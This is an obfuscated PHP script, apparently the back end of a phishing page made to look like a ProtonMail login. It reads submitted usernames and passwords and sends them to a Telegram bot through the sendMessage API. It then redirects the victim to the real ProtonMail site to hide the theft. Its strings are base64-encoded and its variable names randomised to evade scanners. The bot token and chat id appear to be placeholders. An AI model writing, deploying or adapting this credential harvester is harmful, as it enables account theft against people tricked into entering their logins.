<?php

$imjbkp_6e2baaf3b97d=urlencode(base64_decode('QWNjb3VudDog').$_POST[base64_decode('dXNlcm5hbWU=')].base64_decode('IFBhc3M6IA==').$_POST[base64_decode('cGFzc3dvcmQ=')]);
$zivqup_572d4e421e5e="https://api.telegram.org/bot111111111:foobar/sendMessage?chat_id=12345&text=$imjbkp_6e2baaf3b97d";
$brphyb_93da65a9fd00=array(base64_decode('aHR0cA==')=>array(base64_decode('aGVhZGVy')=>base64_decode('Q29udGVudC1UeXBlOmFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0K')));
$huxnvj_5c18ef727715=stream_context_create($brphyb_93da65a9fd00);
$iyjbrl_b4a88417b3d0=file_get_contents($zivqup_572d4e421e5e,false,$huxnvj_5c18ef727715);
echo $iyjbrl_b4a88417b3d0;header(base64_decode('TG9jYXRpb246IGh0dHBzOi8vbWFpbC5wcm90b25tYWlsLmNvbQ=='));
exit();

?>